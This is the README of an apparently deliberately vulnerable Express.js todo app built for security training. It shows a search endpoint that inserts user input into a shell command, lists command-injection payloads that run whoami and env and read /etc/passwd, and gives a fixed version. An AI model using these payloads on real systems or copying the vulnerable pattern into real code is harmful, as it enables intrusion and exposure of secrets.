# 🔓 Vulnerable Todo App

A deliberately vulnerable todo list application built with Express.js for security education and testing purposes.

## ⚠️ **WARNING**

This application contains **intentional security vulnerabilities** and should **NEVER** be deployed in a production environment. It is designed solely for educational purposes, security training, and penetration testing practice.

## Features

- ✅ Full CRUD operations for todos
- 🎨 Modern, responsive UI
- 🔍 Search functionality
- ⚠️ **Vulnerable search endpoint** (Command Injection)

## Installation & Setup

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Start the server:**
   ```bash
   npm start
   ```

   Or for development with auto-restart:
   ```bash
   npm run dev
   ```

3. **Access the application:**
   Open your browser and go to: `http://localhost:8000`

## 🎯 Command Injection Vulnerability

### Location
The vulnerability exists in the search endpoint: `/api/search`

### How it works
The search functionality appears to just log search terms, but executes system commands using user input without proper sanitization:

```javascript
// VULNERABLE CODE (in server.js)
const command = `echo "Search performed for: ${searchTerm}"`;
exec(command, (error, stdout, stderr) => {
    // Command output is returned to the client
});
```

The developer intended to simply log search queries, but by directly inserting user input into a shell command without sanitization, they created a command injection vulnerability.

### Exploitation Examples

#### 1. Basic Command Execution
Try searching for:
```
hello"; whoami; echo "
```
This will execute `whoami` and show the current user.

#### 2. View System Information
```
hello"; uname -a; echo "
```
Shows system information.

#### 3. View Current Directory
```
hello"; pwd; echo "
```
Shows the current working directory.

#### 4. List Directory Contents
```
hello"; ls -la; echo "
```
Lists all files in the current directory.

#### 5. List Running Processes
```
hello"; ps aux; echo "
```
Lists all running processes.

#### 6. Read Files (if accessible)
```
hello"; cat /etc/passwd; echo "
```
Attempts to read the passwd file (Unix/Linux systems).

#### 7. Environment Variables
```
hello"; env; echo "
```
Displays environment variables.

#### 8. Simple Commands
```
hello"; id; echo "
```
Shows user ID and group information.

### Why This is Dangerous

1. **Code Execution**: Attackers can run arbitrary system commands
2. **Information Disclosure**: Sensitive system information can be exposed
3. **Privilege Escalation**: Commands run with the same privileges as the Node.js process
4. **Data Exfiltration**: Attackers could potentially access and steal data
5. **System Compromise**: In worst cases, could lead to full system compromise

## Remediation

To fix this vulnerability:

1. **Input Validation**: Validate and sanitize all user inputs
2. **Parameterized Queries**: Use parameterized database queries instead of string concatenation
3. **Avoid System Commands**: Don't execute system commands with user input
4. **Use Safe Alternatives**: Use safer alternatives like database search instead of `grep`

### Secure Implementation Example:

```javascript
// SECURE VERSION
app.get('/api/search', (req, res) => {
    const searchTerm = req.query.q;

    if (!searchTerm) {
        return res.status(400).json({ error: 'Search term is required' });
    }

    // Input validation
    if (!/^[a-zA-Z0-9\s]+$/.test(searchTerm)) {
        return res.status(400).json({ error: 'Invalid search term' });
    }

    // Search only in the application data, not system commands
    const filteredTodos = todos.filter(todo =>
        todo.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
        todo.description.toLowerCase().includes(searchTerm.toLowerCase())
    );

    res.json({
        searchTerm,
        todos: filteredTodos
    });
});
```

## Learning Objectives

By using this vulnerable application, you can learn about:

- Command injection vulnerabilities
- Input validation importance
- Secure coding practices
- Web application security testing
- Penetration testing techniques

## Legal Notice

This tool is provided for educational purposes only. Users are responsible for ensuring they have proper authorization before testing against any systems. Unauthorized access to computer systems is illegal.

## License

MIT License - Use responsibly and ethically.
